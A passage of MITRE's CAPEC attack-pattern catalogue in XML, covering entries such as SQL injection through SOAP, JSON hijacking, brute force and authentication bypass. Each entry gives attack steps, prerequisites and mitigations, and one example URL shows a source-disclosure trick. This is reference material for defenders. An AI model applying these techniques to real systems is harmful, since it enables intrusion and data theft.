               <Technique>Manipulate the MIME sent in order to confuse the web server.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Web server software must rely on file name or file extension for processing.</Prerequisite>
            <Prerequisite>The attacker must be able to make HTTP requests to the web server.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To modify file name or file extension</Skill>
            <Skill Level="Medium">To use misclassification to force the Web server to disclose configuration information, source, or binary data</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Server routines should be determined by content not determined by filename or file extension.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>J2EE application servers are supposed to execute Java Server Pages (JSP). There have been disclosure issues relating to Orion Application Server, where an attacker that appends either a period (.) or space characters to the end of a legitimate Http request, then the server displays the full source code in the attackers' web browser.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://victim.site/login.jsp.</xhtml:div>
               <xhtml:p>Since remote data and directory access may be accessed directly from the JSP, this is a potentially very serious issue.</xhtml:p>
               <xhtml:p>[R.11.2]</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="430"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="110" Name="SQL Injection through SOAP Parameter Tampering" Abstraction="Detailed" Status="Draft">
         <Description>An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="280"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Detect Incorrect SOAP Parameter Handling] The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.</Description>
               <Technique>The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Inject SQL via SOAP Parameters] The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.</Description>
               <Technique>An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>SOAP messages are used as a communication mechanism in the system</Prerequisite>
            <Prerequisite>SOAP parameters are not properly validated at the service provider</Prerequisite>
            <Prerequisite>The service provider does not properly utilize parameter binding when building SQL queries</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">If the attacker is able to gain good understanding of the system's database schema</Skill>
            <Skill Level="High">If the attacker has to perform SQL injection blindly</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Properly validate and sanitize/reject user input at the service provider.</Mitigation>
            <Mitigation>Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query.</Mitigation>
            <Mitigation>At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. He notices that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies his payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="89"/>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="111" Name="JSON Hijacking (aka JavaScript Hijacking)" Abstraction="Detailed" Status="Draft">
         <Description>An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website. An attacker gets the victim to visit his or her malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server. There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="212"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Understand How to Request JSON Responses from the Target System] An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.</Description>
               <Technique>An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers' ability to craft the exploit.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Craft a malicious website]<xhtml:p>The attacker crafts a malicious website to which he plans to lure the victim who is using the vulnerable target system. The malicious website does two things:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest).</xhtml:li>
                        <xhtml:li>2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker.</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
                  <xhtml:p>This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain.</xhtml:p>
               </Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Launch JSON hijack] An attacker lures the victim to the malicious website or leverages other means to get his malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.</Description>
               <Technique>An attacker employs a myriad of standard techniques to get the victim to visit his or her malicious site or by some other means get the attackers' malicious code executing in the victim's browser.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>JSON is used as a transport mechanism between the client and the server</Prerequisite>
            <Prerequisite>The target server cannot differentiate real requests from forged requests</Prerequisite>
            <Prerequisite>The JSON object returned from the server can be accessed by the attackers' malicious code via a script tag</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Once this attack pattern is developed and understood, creating an exploit is not very complex.The attacker needs to have knowledge of the URLs that need to be accessed on the target system to request the JSON objects.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF), which is to use a hard to guess random nonce (that is unique to the victim's session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce.</Mitigation>
            <Mitigation>On the client side, the system's design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable, it cannot be readily modified by the attacker before being used by a script tag. For instance, if while(1) was added to the beginning of the JavaScript returned by the server, trying to access it with a script tag would result in an infinite loop. On the other hand, legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags, or using other similar techniques (e.g. wrapping the JavaScript with HTML tags).</Mitigation>
            <Mitigation>Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session.</Mitigation>
            <Mitigation>Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role, hence the same origin policy does not adequate address this scenario.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when he or she receives it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail.</xhtml:p>
               <xhtml:p>When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="352"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="112" Name="Brute Force" Abstraction="Meta" Status="Draft">
         <Description>In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset. Examples of secrets can include, but are not limited to, passwords, encryption keys, database lookup keys, and initial values to one-way functions. The key factor in this attack is the attackers' ability to explore the possible secret space rapidly. This, in turn, is a function of the size of the secret space and the computational power the attacker is able to bring to bear on the problem. If the attacker has modest resources and the secret space is large, the challenge facing the attacker is intractable. While the defender cannot control the resources available to an attacker, they can control the size of the secret space. Creating a large secret space involves selecting one's secret from as large a field of equally likely alternative secrets as possible and ensuring that an attacker is unable to reduce the size of this field using available clues or cryptanalysis. Doing this is more difficult than it sounds since elimination of patterns (which, in turn, would provide an attacker clues that would help them reduce the space of potential secrets) is difficult to do using deterministic machines, such as computers. Assuming a finite secret space, a brute force attack will eventually succeed. The defender must rely on making sure that the time and resources necessary to do so will exceed the value of the information. For example, a secret space that will likely take hundreds of years to explore is likely safe from raw-brute force attacks.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine secret testing procedure] Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.</Description>
               <Technique>Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attackers' position is significantly degraded.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Reduce search space] Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.</Description>
               <Technique>If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.)</Technique>
               <Technique>If the secret was chosen algorithmically, cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.</Technique>
               <Technique>If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.</Technique>
               <Technique>Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Explore</Phase>
               <Description>[Expand victory conditions] It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Gather information so attack can be performed independently.] If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The attacker must be able to determine when they have successfully guessed the secret. As such, one-time pads are immune to this type of attack since there is no way to determine when a guess is correct.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The attack simply requires basic scripting ability to automate the exploration of the search space. More sophisticated attackers may be able to use more advanced methods to reduce the search space and increase the speed with which the secret is located.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources the attacker has at their disposal. This attack method is resource expensive: having large amounts of computational power do not guarantee timely success, but having only minimal resources makes the problem intractable against all but the weakest secret selection procedures.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Repeated submissions of incorrect secret values may indicate a brute force attack. For example, repeated bad passwords when accessing user accounts or repeated queries to databases using non-existent keys.</Indicator>
            <Indicator>Attempts to download files protected by secrets (usually using encryption) may be a precursor to an offline attack to break the file's encryption and read its contents. This is especially significant if the file itself contains other secret values, such as password files.</Indicator>
            <Indicator>If the attacker is able to perform the checking offline then there will likely be no indication that an attack is ongoing.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Select a provably large secret space for selection of the secret. Provably large means that the procedure by which the secret is selected does not have artifacts that significantly reduce the size of the total secret space.</Mitigation>
            <Mitigation>Do not provide the means for an attacker to determine success independently. This forces the attacker to check their guesses against an external authority, which can slow the attack and warn the defender. This mitigation may not be possible if testing material must appear externally, such as with a transmitted cryptotext.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="330"/>
            <Related_Weakness CWE_ID="326"/>
            <Related_Weakness CWE_ID="521"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="113" Name="API Manipulation" Abstraction="Meta" Status="Stable">
         <Description>An adversary manipulates the use or processing of an Application Programming Interface (API) resulting in an adverse impact upon the security of the system implementing the API. This can allow the adversary to execute functionality not intended by the API implementation, possibly compromising the system which integrates the API. API manipulation can take on a number of forms including forcing the unexpected use of an API, or the use of an API in an unintended way. For example, an adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution. Another example could be API methods that should be disabled in a production application but were not, thus exposing dangerous functionality within a production environment.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The requirements vary depending upon the nature of the API. For application-layer APIs related to the processing of the HTTP protocol, one or more of the following may be needed: a MITM (Man-In-The-Middle) proxy, a web browser, or a programming/scripting language.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="227"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">API Abuse/Misuse</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="114" Name="Authentication Abuse" Abstraction="Meta" Status="Draft">
         <Description>An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the "Exploitation of Session Variables, Resource IDs and other Trusted Credentials" attack patterns.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="287"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="115" Name="Authentication Bypass" Abstraction="Meta" Status="Draft">
         <Description>An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place. This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other authentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A client application, such as a web browser, or a scripting language capable of interacting with the target.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="287"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="116" Name="Excavation" Abstraction="Meta" Status="Stable">
         <Description>An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>An adversary requires some way of interacting with the system.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool, such as a MITM Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Minimize error/response output to only what is necessary for functional use or corrective language.</Mitigation>
            <Mitigation>Remove potentially sensitive information that is not necessary for the application's functionality.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Notes>
            <Note Type="Other">Large quantities of data is often moved from the target system to some other adversary controlled system. Data found on a target system might require extensive resources to be fully analyzed. Using these resources on the target system might enable a defender to detect the adversary. Additionally, proper analysis tools required might not be available on the target system.</Note>
            <Note Type="Other">This attack differs from Data Interception and other data collection attacks in that the attacker actively queries the target rather than simply watching for the target to reveal information.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Other_Notes, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="117" Name="Interception" Abstraction="Meta" Status="Stable">
